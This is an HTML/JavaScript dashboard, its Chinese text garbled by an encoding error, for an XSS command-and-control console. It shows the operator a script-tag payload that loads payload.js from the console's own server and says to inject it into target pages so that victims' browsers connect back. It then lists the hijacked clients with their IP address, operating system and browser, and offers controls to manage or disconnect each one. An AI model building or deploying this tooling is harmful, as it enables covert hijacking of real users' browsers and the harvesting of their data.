<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS ç®¡ç†å¹³å°</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            color: #333;
        }

        .header {
            background: white;
            padding: 1rem 2rem;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 1.5rem;
            font-weight: 700;
            color: #4a6cf7;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .logo::before {
            content: "ğŸ›¡ï¸";
            font-size: 1.2rem;
        }

        .header-actions {
            display: flex;
            gap: 1rem;
            align-items: center;
        }

        .stats {
            display: flex;
            gap: 1.5rem;
            font-size: 0.9rem;
            color: #666;
        }

        .stat-item {
            display: flex;
            align-items: center;
            gap: 0.3rem;
        }

        .stat-value {
            font-weight: 600;
            color: #4a6cf7;
        }

        .btn {
            padding: 0.5rem 1rem;
            border: none;
            border-radius: 6px;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
        }

        .btn-primary {
            background: #4a6cf7;
            color: white;
        }

        .btn-primary:hover {
            background: #3a5ce5;
            transform: translateY(-1px);
        }

        .btn-secondary {
            background: #f0f2f5;
            color: #4a6cf7;
            border: 1px solid #e0e4e8;
        }

        .btn-secondary:hover {
            background: #e0e4e8;
        }

        .btn-danger {
            background: #ff6b6b;
            color: white;
        }

        .btn-danger:hover {
            background: #ff5252;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 2rem;
        }

        .section {
            background: white;
            border-radius: 10px;
            padding: 2rem;
            margin-bottom: 2rem;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid #f0f0f0;
        }

        .section-title {
            font-size: 1.3rem;
            font-weight: 600;
            color: #333;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .payload-section {
            background: linear-gradient(135deg, #4a6cf7 0%, #3a5ce5 100%);
            color: white;
        }

        .payload-section .section-title {
            color: white;
        }

        .payload-code {
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 6px;
            padding: 1rem;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            word-break: break-all;
            margin: 1rem 0;
            color: #fff;
        }

        /* å®¢æˆ·ç«¯è¡¨æ ¼æ ·å¼ */
        .clients-table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        .clients-table th {
            background: #f8f9fa;
            padding: 1rem;
            text-align: center;
            font-weight: 600;
            color: #333;
            border-bottom: 1px solid #e0e4e8;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
        }

        .clients-table th:hover {
            background: #f0f2f5;
        }

        .clients-table th.sorted-asc::after {
            content: "â–²";
            position: absolute;
            right: 10px;
            color: #4a6cf7;
        }

        .clients-table th.sorted-desc::after {
            content: "â–¼";
            position: absolute;
            right: 10px;
            color: #4a6cf7;
        }

        .clients-table td {
            padding: 1rem;
            border-bottom: 1px solid #f0f0f0;
            vertical-align: middle;
        }

        .clients-table tr:last-child td {
            border-bottom: none;
        }

        .clients-table tr:hover {
            background: #f9f9f9;
        }

        .client-id {
            font-family: 'Courier New', monospace;
            font-weight: 600;
            color: #4a6cf7;
            min-width: 180px;
        }

        .client-detail {
            display: flex;
            flex-direction: column;
        }

        .detail-label {
            font-size: 0.8rem;
            color: #888;
            display: none; /* éšè—æ ‡ç­¾ï¼Œå› ä¸ºå·²ç»æœ‰è¡¨å¤´ */
        }

        .detail-value {
            font-size: 0.9rem;
        }

        .client-actions {
            display: flex;
            gap: 0.5rem;
            justify-content: flex-end;
        }

        .client-status {
            padding: 0.3rem 0.8rem;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-online {
            background: #e6f7e6;
            color: #28a745;
            border: 1px solid #c3e6cb;
        }

        .client-actions {
            display: flex;
            gap: 0.5rem;
        }

        .empty-state {
            text-align: center;
            padding: 3rem 1rem;
            color: #888;
            background: #f9f9f9;
            border-radius: 8px;
            border: 1px dashed #e0e4e8;
        }

        .empty-state-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
            opacity: 0.5;
        }

        .empty-state-text {
            font-size: 1.1rem;
            margin-bottom: 0.5rem;
        }

        .empty-state-subtext {
            font-size: 0.9rem;
            opacity: 0.7;
        }

        .refresh-indicator {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.8rem;
            color: #666;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .refresh-indicator.show {
            opacity: 1;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .spinning {
            animation: spin 1s linear infinite;
        }

        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }
            
            .header-content {
                flex-direction: column;
                gap: 1rem;
            }
            
            .stats {
                flex-wrap: wrap;
                justify-content: center;
            }
            
            .client-info {
                flex-direction: column;
                align-items: flex-start;
                gap: 0.5rem;
            }
            
            .client-details {
                flex-direction: column;
                gap: 0.5rem;
            }
            
            .client-row {
                flex-direction: column;
                align-items: flex-start;
                gap: 1rem;
            }
            
            .client-actions {
                width: 100%;
            }
            
            .client-actions button {
                flex: 1;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">XSS ç®¡ç†å¹³å°</div>
            <div class="header-actions">
                <div class="stats">
                    <div class="stat-item">
                        <span>åœ¨çº¿å®¢æˆ·ç«¯</span>
                        <span class="stat-value" id="clientCount">0</span>
                    </div>
                    <div class="stat-item">
                        <span>è¿è¡Œæ—¶é—´</span>
                        <span class="stat-value" id="uptime">--</span>
                    </div>
                </div>
                <div class="refresh-indicator" id="refreshIndicator">
                    <span>ğŸ”„</span>
                    <span>æ›´æ–°ä¸­...</span>
                </div>
                <button class="btn btn-secondary" onclick="refreshClients()">
                    <span>ğŸ”„</span>
                    åˆ·æ–°
                </button>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="section payload-section">
            <div class="section-header">
                <h2 class="section-title">
                    <span>âš¡</span>
                    Payload ä»£ç 
                </h2>
                <button class="btn btn-secondary" onclick="copyPayload()">
                    <span>ğŸ“‹</span>
                    å¤åˆ¶ä»£ç 
                </button>
            </div>
            <div class="payload-code" id="payloadCode">
                <!-- å°†ç”±JavaScriptåŠ¨æ€å¡«å…… -->
            </div>
            <p style="opacity: 0.9; font-size: 0.9rem; margin-top: 1rem;">
                å°†ä¸Šè¿°ä»£ç æ³¨å…¥åˆ°ç›®æ ‡é¡µé¢å³å¯å»ºç«‹è¿æ¥ã€‚å®¢æˆ·ç«¯å°†è‡ªåŠ¨è¿æ¥åˆ°æ§åˆ¶å°ã€‚
            </p>
        </div>

        <div class="section">
            <div class="section-header">
                <h2 class="section-title">
                    <span>ğŸ‘¥</span>
                    åœ¨çº¿å®¢æˆ·ç«¯
                </h2>
                <div style="display: flex; gap: 1rem; align-items: center;">
                    <span style="font-size: 0.9rem; color: #666;">è‡ªåŠ¨åˆ·æ–°: 2ç§’</span>
                </div>
            </div>
            <div id="clientsList">
                <table class="clients-table" id="clientsTable" style="display: none;">
                    <thead>
                        <tr>
                            <th data-sort="id">å®¢æˆ·ç«¯ID</th>
                            <th data-sort="ip">IPåœ°å€</th>
                            <th data-sort="onlineAt">ä¸Šçº¿æ—¶é—´</th>
                            <th data-sort="lastSeen">æœ€åæ´»è·ƒ</th>
                            <th data-sort="os">æ“ä½œç³»ç»Ÿ</th>
                            <th data-sort="browser">æµè§ˆå™¨</th>
                            <th data-sort="status">çŠ¶æ€</th>
                            <th>æ“ä½œ</th>
                        </tr>
                    </thead>
                    <tbody>
                        <!-- å®¢æˆ·ç«¯è¡Œå°†åŠ¨æ€ç”Ÿæˆ -->
                    </tbody>
                </table>
                <div class="empty-state" id="emptyState">
                    <div class="empty-state-icon">ğŸ”</div>
                    <div class="empty-state-text">æš‚æ— åœ¨çº¿å®¢æˆ·ç«¯</div>
                    <div class="empty-state-subtext">ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let startTime = Date.now();

        // æ›´æ–°è¿è¡Œæ—¶é—´
        function updateUptime() {
            const now = Date.now();
            const diff = Math.floor((now - startTime) / 1000);
            const hours = Math.floor(diff / 3600);
            const minutes = Math.floor((diff % 3600) / 60);
            const seconds = diff % 60;
            
            let uptime = '';
            if (hours > 0) uptime += hours + 'æ—¶';
            if (minutes > 0) uptime += minutes + 'åˆ†';
            uptime += seconds + 'ç§’';
            
            document.getElementById('uptime').textContent = uptime;
        }

        // è·å–æœåŠ¡å™¨é…ç½®å¹¶è®¾ç½® Payload
        let serverBaseUrl = '';
        
        function getServerConfig() {
            // ä»å½“å‰URLè·å–åŸºç¡€URL
            const protocol = window.location.protocol;
            const host = window.location.host;
            serverBaseUrl = `${protocol}//${host}`;
            
            // è®¾ç½® Payload ä»£ç 
            updatePayloadCode();
        }
        
        function updatePayloadCode() {
            const payloadCode = `<script src="${serverBaseUrl}/payload.js"><\/script>`;
            document.getElementById('payloadCode').innerHTML = payloadCode;
        }
        
        // å¤åˆ¶ Payload
        function copyPayload() {
            const payloadText = `<script src="${serverBaseUrl}/payload.js"><\/script>`;
            navigator.clipboard.writeText(payloadText).then(() => {
                const btn = event.target.closest('button');
                const originalText = btn.innerHTML;
                btn.innerHTML = '<span>âœ…</span>å·²å¤åˆ¶';
                setTimeout(() => {
                    btn.innerHTML = originalText;
                }, 2000);
            });
        }

        // åˆ·æ–°å®¢æˆ·ç«¯åˆ—è¡¨
        async function refreshClients() {
            const indicator = document.getElementById('refreshIndicator');
            indicator.classList.add('show');
            indicator.querySelector('span').classList.add('spinning');
            
            try {
                await loadClients();
            } finally {
                setTimeout(() => {
                    indicator.classList.remove('show');
                    indicator.querySelector('span').classList.remove('spinning');
                }, 500);
            }
        }

        // å…¨å±€å˜é‡
        let clients = [];
        let currentSort = { column: 'lastSeen', direction: 'desc' };
        
        // è§£æç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²ï¼Œæå–æ“ä½œç³»ç»Ÿå’Œæµè§ˆå™¨ä¿¡æ¯
        function parseUserAgent(userAgent) {
            if (!userAgent) return { os: 'æœªçŸ¥', browser: 'æœªçŸ¥' };
            
            // æ“ä½œç³»ç»Ÿæ£€æµ‹
            let os = 'æœªçŸ¥';
            if (userAgent.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10';
            else if (userAgent.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1';
            else if (userAgent.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8';
            else if (userAgent.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
            else if (userAgent.indexOf('Windows NT 6.0') !== -1) os = 'Windows Vista';
            else if (userAgent.indexOf('Windows NT 5.1') !== -1) os = 'Windows XP';
            else if (userAgent.indexOf('Windows NT') !== -1) os = 'Windows NT';
            else if (userAgent.indexOf('Mac OS X') !== -1) {
                const macOSVersion = userAgent.match(/Mac OS X ([0-9_]+)/);
                if (macOSVersion && macOSVersion[1]) {
                    const version = macOSVersion[1].replace(/_/g, '.');
                    os = 'macOS ' + version;
                } else {
                    os = 'macOS';
                }
            }
            else if (userAgent.indexOf('iPhone') !== -1) os = 'iOS';
            else if (userAgent.indexOf('iPad') !== -1) os = 'iPadOS';
            else if (userAgent.indexOf('Android') !== -1) {
                const androidVersion = userAgent.match(/Android ([0-9\.]+)/);
                if (androidVersion && androidVersion[1]) {
                    os = 'Android ' + androidVersion[1];
                } else {
                    os = 'Android';
                }
            }
            else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
            else if (userAgent.indexOf('CentOS') !== -1) os = 'CentOS';
            else if (userAgent.indexOf('Ubuntu') !== -1) os = 'Ubuntu';
            
            // æµè§ˆå™¨æ£€æµ‹ - ä¸­å›½ç‰¹è‰²æµè§ˆå™¨ä¼˜å…ˆæ£€æµ‹
            let browser = 'æœªçŸ¥';
            
            // æœç‹—æµè§ˆå™¨
            if (userAgent.indexOf('SE') !== -1 && userAgent.indexOf('MetaSr') !== -1) {
                browser = 'æœç‹—æµè§ˆå™¨';
            }
            // QQæµè§ˆå™¨
            else if (userAgent.indexOf('QQBrowser') !== -1) {
                const qqVersion = userAgent.match(/QQBrowser\/([0-9\.]+)/);
                if (qqVersion && qqVersion[1]) {
                    browser = 'QQæµè§ˆå™¨ ' + qqVersion[1];
                } else {
                    browser = 'QQæµè§ˆå™¨';
                }
            }
            // å¾®ä¿¡å†…ç½®æµè§ˆå™¨
            else if (userAgent.indexOf('MicroMessenger') !== -1) {
                const wxVersion = userAgent.match(/MicroMessenger\/([0-9\.]+)/);
                if (wxVersion && wxVersion[1]) {
                    browser = 'å¾®ä¿¡ ' + wxVersion[1];
                } else {
                    browser = 'å¾®ä¿¡';
                }
            }
            // UCæµè§ˆå™¨
            else if (userAgent.indexOf('UCBrowser') !== -1) {
                const ucVersion = userAgent.match(/UCBrowser\/([0-9\.]+)/);
                if (ucVersion && ucVersion[1]) {
                    browser = 'UCæµè§ˆå™¨ ' + ucVersion[1];
                } else {
                    browser = 'UCæµè§ˆå™¨';
                }
            }
            // ç™¾åº¦æµè§ˆå™¨
            else if (userAgent.indexOf('Baidu') !== -1 || userAgent.indexOf('BIDUBrowser') !== -1) {
                browser = 'ç™¾åº¦æµè§ˆå™¨';
            }
            // 360æµè§ˆå™¨
            else if (userAgent.indexOf('360EE') !== -1 || userAgent.indexOf('360SE') !== -1) {
                browser = '360æµè§ˆå™¨';
            }
            // çŒè±¹æµè§ˆå™¨
            else if (userAgent.indexOf('LBBROWSER') !== -1) {
                browser = 'çŒè±¹æµè§ˆå™¨';
            }
            // åä¸ºæµè§ˆå™¨
            else if (userAgent.indexOf('HuaweiBrowser') !== -1) {
                browser = 'åä¸ºæµè§ˆå™¨';
            }
            // OPPOæµè§ˆå™¨
            else if (userAgent.indexOf('HeyTapBrowser') !== -1) {
                browser = 'OPPOæµè§ˆå™¨';
            }
            // vivoæµè§ˆå™¨
            else if (userAgent.indexOf('VivoBrowser') !== -1) {
                browser = 'vivoæµè§ˆå™¨';
            }
            // å°ç±³æµè§ˆå™¨
            else if (userAgent.indexOf('MiuiBrowser') !== -1) {
                browser = 'å°ç±³æµè§ˆå™¨';
            }
            // å¤¸å…‹æµè§ˆå™¨
            else if (userAgent.indexOf('Quark') !== -1) {
                browser = 'å¤¸å…‹æµè§ˆå™¨';
            }
            // å›½é™…æµè§ˆå™¨
            else if (userAgent.indexOf('Edge') !== -1 || userAgent.indexOf('Edg/') !== -1) {
                const edgeVersion = userAgent.match(/Edg\/([0-9\.]+)/);
                if (edgeVersion && edgeVersion[1]) {
                    browser = 'Edge ' + edgeVersion[1];
                } else {
                    browser = 'Edge';
                }
            }
            else if (userAgent.indexOf('Chrome') !== -1) {
                const chromeVersion = userAgent.match(/Chrome\/([0-9\.]+)/);
                if (chromeVersion && chromeVersion[1]) {
                    browser = 'Chrome ' + chromeVersion[1];
                } else {
                    browser = 'Chrome';
                }
            }
            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) {
                const safariVersion = userAgent.match(/Safari\/([0-9\.]+)/);
                if (safariVersion && safariVersion[1]) {
                    browser = 'Safari ' + safariVersion[1];
                } else {
                    browser = 'Safari';
                }
            }
            else if (userAgent.indexOf('Firefox') !== -1) {
                const firefoxVersion = userAgent.match(/Firefox\/([0-9\.]+)/);
                if (firefoxVersion && firefoxVersion[1]) {
                    browser = 'Firefox ' + firefoxVersion[1];
                } else {
                    browser = 'Firefox';
                }
            }
            else if (userAgent.indexOf('MSIE') !== -1 || userAgent.indexOf('Trident/') !== -1) {
                const ieVersion = userAgent.match(/MSIE ([0-9\.]+)/);
                if (ieVersion && ieVersion[1]) {
                    browser = 'IE ' + ieVersion[1];
                } else {
                    browser = 'IE';
                }
            }
            
            return { os, browser };
        }

        // åŠ è½½å®¢æˆ·ç«¯åˆ—è¡¨
        async function loadClients() {
            try {
                const response = await fetch('/api/clients');
                if (!response.ok) throw new Error('Network response was not ok');
                
                clients = await response.json();
                const countElement = document.getElementById('clientCount');
                const clientsTable = document.getElementById('clientsTable');
                const emptyState = document.getElementById('emptyState');
                
                countElement.textContent = clients.length;
                
                if (clients.length === 0) {
                    clientsTable.style.display = 'none';
                    emptyState.style.display = 'block';
                    return;
                }

                // æ˜¾ç¤ºè¡¨æ ¼ï¼Œéšè—ç©ºçŠ¶æ€
                clientsTable.style.display = 'table';
                emptyState.style.display = 'none';

                // æ’åºå®¢æˆ·ç«¯
                sortClients(currentSort.column, currentSort.direction);
                
            } catch (error) {
                console.error('Failed to load clients:', error);
                const clientsTable = document.getElementById('clientsTable');
                const emptyState = document.getElementById('emptyState');
                
                clientsTable.style.display = 'none';
                emptyState.style.display = 'block';
                emptyState.innerHTML = '<div class="empty-state-icon">ğŸ”</div>' +
                    '<div class="empty-state-text">æš‚æ— ä¼šè¯</div>' +
                    '<div class="empty-state-subtext">ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥...</div>';
            }
        }

        // æ’åºå®¢æˆ·ç«¯
        function sortClients(column, direction) {
            // ä¿å­˜å½“å‰æ’åºçŠ¶æ€
            currentSort.column = column;
            currentSort.direction = direction;
            
            // æ›´æ–°è¡¨å¤´æ ·å¼
            const headers = document.querySelectorAll('#clientsTable th');
            headers.forEach(header => {
                header.classList.remove('sorted-asc', 'sorted-desc');
                if (header.getAttribute('data-sort') === column) {
                    header.classList.add(direction === 'asc' ? 'sorted-asc' : 'sorted-desc');
                }
            });
            
            // æ’åºå®¢æˆ·ç«¯æ•°ç»„
            clients.sort((a, b) => {
                let valueA, valueB;
                
                switch (column) {
                    case 'id':
                        valueA = a.id;
                        valueB = b.id;
                        break;
                    case 'ip':
                        valueA = a.ip;
                        valueB = b.ip;
                        break;
                    case 'onlineAt':
                        valueA = new Date(a.onlineAt).getTime();
                        valueB = new Date(b.onlineAt).getTime();
                        break;
                    case 'lastSeen':
                        valueA = new Date(a.lastSeen).getTime();
                        valueB = new Date(b.lastSeen).getTime();
                        break;
                    case 'os':
                        valueA = parseUserAgent(a.userAgent).os;
                        valueB = parseUserAgent(b.userAgent).os;
                        break;
                    case 'browser':
                        valueA = parseUserAgent(a.userAgent).browser;
                        valueB = parseUserAgent(b.userAgent).browser;
                        break;
                    default:
                        valueA = a.id;
                        valueB = b.id;
                }
                
                if (direction === 'asc') {
                    return valueA > valueB ? 1 : -1;
                } else {
                    return valueA < valueB ? 1 : -1;
                }
            });
            
            // æ¸²æŸ“æ’åºåçš„å®¢æˆ·ç«¯
            renderClients();
        }

        // ç®€åŒ–å®¢æˆ·ç«¯IDæ˜¾ç¤º
        function simplifyClientId(id) {
            // å¦‚æœIDæ ¼å¼ä¸º client_timestampï¼Œåˆ™æå–å6ä½æ•°å­—
            if (id && id.startsWith('client_')) {
                const numPart = id.substring(7); // å»æ‰ "client_" å‰ç¼€
                if (numPart.length > 6) {
                    return 'å®¢æˆ·ç«¯_' + numPart.substring(numPart.length - 6);
                }
            }
            return id;
        }

        // æ¸²æŸ“å®¢æˆ·ç«¯è¡¨æ ¼
        function renderClients() {
            const tbody = document.querySelector('#clientsTable tbody');
            
            tbody.innerHTML = clients.map(client => {
                // ä¼˜å…ˆæ˜¾ç¤ºå…¬ç½‘IP
                const ipAddress = client.publicIP || client.ip || 'æœªçŸ¥';
                
                // è§£æç”¨æˆ·ä»£ç†
                const { os, browser } = parseUserAgent(client.userAgent);
                
                // ç®€åŒ–å®¢æˆ·ç«¯IDæ˜¾ç¤º
                const simplifiedId = simplifyClientId(client.id);
                
                return `<tr>
                    <td class="client-id" title="${client.id}">${simplifiedId}</td>
                    <td>${ipAddress}</td>
                    <td>${new Date(client.onlineAt).toLocaleString()}</td>
                    <td>${new Date(client.lastSeen).toLocaleString()}</td>
                    <td title="${os}">${os}</td>
                    <td title="${browser}">${browser}</td>
                    <td><div class="client-status status-online">åœ¨çº¿</div></td>
                    <td>
                        <div class="client-actions">
                            <button class="btn btn-primary" onclick="openClient('${client.id}')">
                                <span>âš™ï¸</span>ç®¡ç†
                            </button>
                            <button class="btn btn-danger" onclick="disconnectClient('${client.id}')" title="æ–­å¼€è¿æ¥">
                                <span>âŒ</span>æ–­å¼€
                            </button>
                        </div>
                    </td>
                </tr>`;
            }).join('');
        }

        // æ‰“å¼€å®¢æˆ·ç«¯ç®¡ç†é¡µé¢
        function openClient(clientId) {
            window.open('/client/' + clientId, '_blank');
        }

        // æ–­å¼€å®¢æˆ·ç«¯è¿æ¥
        async function disconnectClient(clientId) {
            if (!confirm('ç¡®å®šè¦æ–­å¼€æ­¤å®¢æˆ·ç«¯è¿æ¥å—ï¼Ÿ')) return;
            
            try {
                const disconnectResponse = await fetch('/api/client/' + clientId + '/disconnect', {
                    method: 'POST'
                });
                
                if (disconnectResponse.ok) {
                    await loadClients();
                } else {
                    alert('æ–­å¼€è¿æ¥å¤±è´¥');
                }
            } catch (error) {
                alert('æ“ä½œå¤±è´¥: ' + error.message);
            }
        }

        // åˆå§‹åŒ–
        document.addEventListener('DOMContentLoaded', () => {
            // è·å–æœåŠ¡å™¨é…ç½®
            getServerConfig();
            
            // æ·»åŠ è¡¨å¤´æ’åºäº‹ä»¶
            const headers = document.querySelectorAll('#clientsTable th[data-sort]');
            headers.forEach(header => {
                header.addEventListener('click', () => {
                    const column = header.getAttribute('data-sort');
                    // å¦‚æœç‚¹å‡»å½“å‰æ’åºåˆ—ï¼Œåˆ™åˆ‡æ¢æ’åºæ–¹å‘
                    const direction = (column === currentSort.column && currentSort.direction === 'asc') ? 'desc' : 'asc';
                    sortClients(column, direction);
                });
            });
            
            loadClients();
            setInterval(loadClients, 2000); // æ¯2ç§’åˆ·æ–°
            setInterval(updateUptime, 1000); // æ¯ç§’æ›´æ–°è¿è¡Œæ—¶é—´
            updateUptime();
        });
    </script>
</body>
</html>